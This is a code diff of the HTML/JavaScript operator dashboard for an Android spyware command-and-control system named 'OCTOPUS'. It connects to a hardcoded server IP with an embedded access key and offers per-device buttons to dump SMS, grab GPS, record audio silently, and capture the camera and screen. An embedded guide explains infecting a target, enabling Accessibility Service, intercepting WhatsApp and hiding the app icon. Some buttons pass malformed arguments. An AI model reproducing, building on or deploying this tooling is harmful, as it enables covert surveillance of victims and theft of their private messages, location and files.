@@ -3,198 +3,210 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OCTOPUS | COMMAND CENTER</title>
+    <title>OCTOPUS CORE | V4.0.1_BETA</title>
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@300;500&display=swap');
+        :root {
+            --neon-red: #ff003c;
+            --dark-bg: #050505;
+            --terminal-green: #00ff41;
+            --toxic-yellow: #f1c40f;
+            --glass: rgba(255, 255, 255, 0.03);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
+
+        body {
+            background-color: var(--dark-bg);
+            background-image: radial-gradient(circle, #111 1px, transparent 1px);
+            background-size: 30px 30px;
+            color: #eee;
+            font-family: 'Fira Code', monospace;
+            overflow-x: hidden;
+        }
+
+        /* --- GLITCH ANIMATION --- */
+        .glitch {
+            font-size: 2rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            position: relative;
+            text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00;
+            animation: glitch 725ms infinite;
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
+            15% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
+            16% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #fffc00; }
+            100% { text-shadow: -0.025em 0 0 #00fffc, -0.025em -0.025em 0 #fc00ff, -0.025em -0.05em 0 #fffc00; }
+        }
+
+        header {
+            padding: 40px;
+            border-bottom: 1px solid #222;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: linear-gradient(to bottom, #000, transparent);
+        }
+
+        .container { display: grid; grid-template-columns: 1fr 350px; gap: 20px; padding: 20px; }
+
+        /* --- TARGET CARDS --- */
+        #target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
         
-        :root { 
-            --red: #ff1a1a; 
-            --bg: #020202; 
-            --panel: #080808; 
-            --border: #151515;
-            --font-main: 'JetBrains Mono', monospace;
-            --font-head: 'Syne', sans-serif;
-        }
-        
-        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
-
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb { background: var(--red); border-radius: 10px; box-shadow: 0 0 10px var(--red); }
-
-        body { 
-            background: var(--bg); 
-            color: #fff; 
-            font-family: var(--font-main); 
-            display: flex; 
-            height: 100vh; 
-            overflow: hidden; 
-        }
-
-        #login-overlay { 
-            position: fixed; inset: 0; background: #000; z-index: 9999; 
-            display: flex; justify-content: center; align-items: center; 
-        }
-        .login-wrap { width: 320px; text-align: center; }
-        .login-wrap h1 { font-family: var(--font-head); font-size: 28px; color: var(--red); letter-spacing: -1px; margin-bottom: 5px; }
-        .login-wrap p { font-size: 10px; color: #444; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 2px; }
-        .login-input { 
-            width: 100%; padding: 15px; background: transparent; border: none; 
-            border-bottom: 2px solid #222; color: var(--red); text-align: center; 
-            font-family: var(--font-main); font-size: 16px; transition: 0.4s;
-        }
-        .login-input:focus { border-bottom-color: var(--red); }
-        .login-btn { 
-            margin-top: 30px; background: transparent; color: #fff; border: 1px solid #333; 
-            padding: 10px 25px; cursor: pointer; font-family: var(--font-head); font-size: 11px;
+        .card {
+            background: var(--glass);
+            border: 1px solid #1a1a1a;
+            padding: 20px;
+            border-radius: 4px;
             transition: 0.3s;
+            position: relative;
+            overflow: hidden;
         }
-        .login-btn:hover { background: var(--red); border-color: var(--red); box-shadow: 0 0 15px var(--red); }
 
-        nav { 
-            width: 280px; background: var(--panel); border-right: 1px solid var(--border); 
-            display: flex; flex-direction: column; padding: 40px 0; 
-        }
-        .brand { padding: 0 40px 40px 40px; font-family: var(--font-head); font-size: 22px; color: var(--red); }
-        
-        .nav-item { 
-            padding: 16px 40px; display: flex; align-items: center; color: #555; 
-            text-decoration: none; font-size: 12px; font-weight: 500; cursor: pointer; 
-            transition: 0.2s; border-left: 3px solid transparent;
-        }
-        .nav-item i { width: 25px; font-size: 14px; margin-right: 15px; }
-        .nav-item:hover, .nav-item.active { color: #fff; background: #0c0c0c; border-left-color: var(--red); }
+        .card:hover { border-color: var(--neon-red); box-shadow: 0 0 15px rgba(255, 0, 60, 0.2); }
 
-        main { flex: 1; display: flex; flex-direction: column; }
-        header { 
-            height: 80px; border-bottom: 1px solid var(--border); 
-            display: flex; align-items: center; justify-content: space-between; 
-            padding: 0 50px; background: #030303; 
+        .card::before {
+            content: 'ONLINE';
+            position: absolute;
+            top: 5px; right: 5px;
+            font-size: 8px; color: var(--terminal-green);
         }
-        .view-name { font-family: var(--font-head); font-size: 14px; color: #fff; text-transform: uppercase; }
-        
-        .content { flex: 1; padding: 50px; overflow-y: auto; }
-        #target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); gap: 30px; }
 
-        .card { background: #0a0a0a; border: 1px solid var(--border); border-radius: 12px; padding: 30px; }
-        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
-        .target-name { font-family: var(--font-head); font-size: 16px; color: var(--red); }
-        
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .action-btn { 
-            background: #0d0d0d; border: 1px solid #1a1a1a; color: #888; 
-            padding: 12px; font-size: 11px; cursor: pointer; border-radius: 6px;
-            display: flex; align-items: center; justify-content: center; transition: 0.2s;
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+
+        button {
+            background: transparent;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 10px;
+            font-family: inherit;
+            font-size: 11px;
+            transition: 0.2s;
+            text-transform: uppercase;
         }
-        .action-btn i { margin-right: 10px; font-size: 12px; }
-        .action-btn:hover { background: #fff; color: #000; border-color: #fff; }
+
+        button:hover { background: var(--neon-red); border-color: var(--neon-red); color: #000; font-weight: bold; }
+
+        /* --- SIDEBAR LOGS --- */
+        .sidebar { background: #000; border: 1px solid #222; padding: 20px; height: 85vh; overflow-y: auto; }
+        #terminal { font-size: 12px; color: var(--terminal-green); line-height: 1.5; }
+
+        /* --- INFO SECTIONS --- */
+        .section { margin-top: 40px; padding: 20px; border-top: 1px solid #222; }
+        .toxic-profile { color: #888; border-left: 2px solid var(--neon-red); padding-left: 15px; }
+        .help-guide { color: var(--toxic-yellow); font-size: 13px; }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .container { grid-template-columns: 1fr; }
+            .sidebar { height: 400px; }
+        }
     </style>
 </head>
 <body>
 
-    <div id="login-overlay">
-        <div class="login-wrap">
-            <h1>OCTOPUS SPY</h1>
-            <p>Master Control Interface</p>
-            <input type="password" id="pass" class="login-input" placeholder="ACCESS KEY" autofocus>
-            <button class="login-btn" onclick="login()">ESTABLISH LINK</button>
-        </div>
+<header>
+    <div>
+        <h1 class="glitch">OCTOPUS_SYSTEM_C2</h1>
+        <p style="font-size: 10px; color: #555;">STATUS: UNTRACEABLE | NODE: 51.68.234.157</p>
     </div>
+    <div id="connection-dot" style="width: 15px; height: 15px; background: red; border-radius: 50%; box-shadow: 0 0 10px red;"></div>
+</header>
 
-    <nav>
-        <div class="brand">OCTOPUS</div>
-        <div class="nav-item active" onclick="tab('Live')"><i class="fa-solid fa-ghost"></i> Live Targets</div>
-        <div class="nav-item" onclick="tab('Files')"><i class="fa-solid fa-folder-open"></i> File Manager</div>
-        <div class="nav-item" onclick="tab('Shell')"><i class="fa-solid fa-terminal"></i> Remote Shell</div>
-        <div class="nav-item" onclick="tab('Keys')"><i class="fa-solid fa-keyboard"></i> Keylogger</div>
-        <div class="nav-item" onclick="tab('Spy')"><i class="fa-solid fa-eye"></i> Live Spy</div>
-        <div class="nav-item" onclick="tab('Sms')"><i class="fa-solid fa-message"></i> SMS Manager</div>
-        <div class="nav-item" onclick="download()" style="margin-top:auto; color:var(--red)"><i class="fa-solid fa-virus"></i> Build Payload</div>
-    </nav>
-
+<div class="container">
     <main>
-        <header>
-            <div class="view-name" id="view-title">LIVE_TARGETS</div>
-            <div id="status" style="font-size: 10px; color: #444; font-weight: 300;">C2_DISCONNECTED</div>
-        </header>
+        <div id="target-grid">
+            </div>
 
-        <div class="content">
-            <div id="target-grid"></div>
+        <div class="section help-guide">
+            <h3>[ HELP_MANUAL.md ]</h3>
+            <p>> 1. COMPILATION: Build APK via PowerShell using gradlew.</p>
+            <p>> 2. INFECTION: Deploy to target. MUST enable Accessibility Service manually.</p>
+            <p>> 3. INTERCEPTION: WhatsApp logs stream automatically once chat is opened.</p>
+            <p>> 4. COMMANDS: Click action buttons to dump SMS (50 count) or pull GPS coords.</p>
+            <p>> 5. SILENCE: App icon hides automatically upon service start.</p>
+        </div>
+
+        <div class="section toxic-profile">
+            <h3>[ ABOUT_DEVELOPER.log ]</h3>
+            <p><strong>NAME:</strong> SAMEER (19-Year-Old Illegal Architect)</p>
+            <p><strong>STATUS:</strong> Mentally Redlining / Depressed / Toxic High-Performance</p>
+            <p><strong>BIO:</strong> Operating in the shadows of the web. I don't build apps; I build nightmares. Zero social life, max code. My code is clean, but my history is blacklisted. I code to forget I'm human.</p>
+            <p><strong>SPECIALTY:</strong> Breaking things that are supposed to be "secure".</p>
         </div>
     </main>
 
-    <script>
-        let socket;
-        const SERVER_URL = "http://51.68.234.157:20211";
+    <aside class="sidebar">
+        <h4 style="margin-bottom: 10px; border-bottom: 1px solid #333;">RAW_DATA_STREAM</h4>
+        <div id="terminal">
+            <p>> Initializing Socket connection...</p>
+            <p>> Waiting for target heartbeat...</p>
+        </div>
+    </aside>
+</div>
 
-        function login() {
-            if(document.getElementById('pass').value === "octopus_xx1") {
-                document.getElementById('login-overlay').style.opacity = '0';
-                setTimeout(() => document.getElementById('login-overlay').remove(), 400);
-                startC2();
-            } else { alert("KEY_ERROR: ACCESS DENIED"); }
-        }
+<script>
+    const socket = io("http://51.68.234.157:20211", { 
+        query: { type: 'mastermind', key: 'octopus_xx1' } 
+    });
 
-        function tab(name) {
-            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-            event.currentTarget.classList.add('active');
-            document.getElementById('view-title').innerText = name.toUpperCase() + "_VIEW";
-        }
+    const term = document.getElementById('terminal');
+    const dot = document.getElementById('connection-dot');
 
-        // REDIRECT TO VPS TRACKER (Matches your GitHub link in index.js)
-        function download() { window.open(`${SERVER_URL}/download-payload`, '_blank'); }
+    socket.on('connect', () => {
+        dot.style.background = 'var(--terminal-green)';
+        dot.style.boxShadow = '0 0 15px var(--terminal-green)';
+        term.innerHTML += `<p style="color:white;">[SYSTEM] Handshake Verified. Mastermind Online.</p>`;
+    });
 
-        function startC2() {
-            socket = io(SERVER_URL, { query: { type: 'mastermind', key: 'octopus_xx1' } });
-            
-            socket.on('connect', () => {
-                document.getElementById('status').innerText = "C2_CONNECTED // TUNNEL_ACTIVE";
-                document.getElementById('status').style.color = "#0f0";
-                initListeners();
-            });
+    socket.on('load_targets', (targets) => {
+        Object.keys(targets).forEach(id => addCard(id, targets[id]));
+    });
 
-            socket.on('disconnect', () => {
-                document.getElementById('status').innerText = "C2_DISCONNECTED";
-                document.getElementById('status').style.color = "#ff1a1a";
-            });
-        }
+    socket.on('update_dashboard', (res) => {
+        addCard(res.id, res.data);
+    });
 
-        function initListeners() {
-            socket.on('notification', (data) => { 
-                alert(`[!] ${data.title}: ${data.message}`); 
-            });
+    socket.on('display_extra', (res) => {
+        const time = new Date().toLocaleTimeString();
+        let color = "var(--terminal-green)";
+        if(res.payload.type === 'wa_log') color = "cyan";
+        if(res.payload.type === 'sms_log') color = "magenta";
 
-            socket.on('update_dashboard', (res) => {
-                let grid = document.getElementById('target-grid');
-                let card = document.getElementById(res.id);
-                
-                if(!card) {
-                    card = document.createElement('div');
-                    card.id = res.id;
-                    card.className = 'card';
-                    grid.prepend(card);
-                }
-                
-                card.innerHTML = `
-                    <div class="card-header">
-                        <span class="target-name">${res.data.model || 'ANDROID_NODE'}</span>
-                        <span style="font-size:9px; color:#333;">${res.id}</span>
-                    </div>
-                    <div class="btn-grid">
-                        <button class="action-btn" onclick="send('${res.id}', 'browse')"><i class="fa-solid fa-folder"></i> FILES</button>
-                        <button class="action-btn" onclick="send('${res.id}', 'mic')"><i class="fa-solid fa-microphone"></i> AUDIO</button>
-                        <button class="action-btn" onclick="send('${res.id}', 'sms')"><i class="fa-solid fa-comment-dots"></i> SMS</button>
-                        <button class="action-btn" onclick="send('${res.id}', 'gps')"><i class="fa-solid fa-location-crosshairs"></i> GPS</button>
-                    </div>
-                `;
-            });
-        }
+        term.innerHTML += `<p style="color:${color}">[${time}] ${res.payload.type.toUpperCase()}: ${JSON.stringify(res.payload.data)}</p>`;
+        term.scrollTop = term.scrollHeight;
+    });
 
-        function send(id, act) { 
-            socket.emit('run_action', { targetId: id, action: act }); 
-        }
-    </script>
+    function addCard(id, data) {
+        if(document.getElementById(id)) return;
+        const div = document.createElement('div');
+        div.id = id;
+        div.className = 'card';
+        div.innerHTML = `
+            <h4 style="color:var(--neon-red)">DEVICE: ${data.model}</h4>
+            <small style="color:#555">ID: ${id}</small>
+            <div class="btn-grid">
+                <button onclick="act('${id}','sms')">DUMP SMS</button>
+                <button onclick="act('${id}','gps')">GPS LOC</button>
+                <button onclick="act('mic')">SILENT REC</button>
+                <button onclick="act('gallery')">FILE DUMP</button>
+                <button onclick="act('cam')">CAM_SNAP</button>
+                <button onclick="act('screen')">SCREEN_CAP</button>
+            </div>
+            <button onclick="act('${id}','off')" style="width:100%; margin-top:10px; color:red; border-color:red;">TERMINATE_LINK</button>
+        `;
+        document.getElementById('target-grid').appendChild(div);
+    }
+
+    function act(id, a) {
+        term.innerHTML += `<p style="color:var(--toxic-yellow)">> Executing ${a} on target ${id}...</p>`;
+        socket.emit('run_action', { targetId: id, action: a });
+    }
+</script>
+
 </body>
 </html>
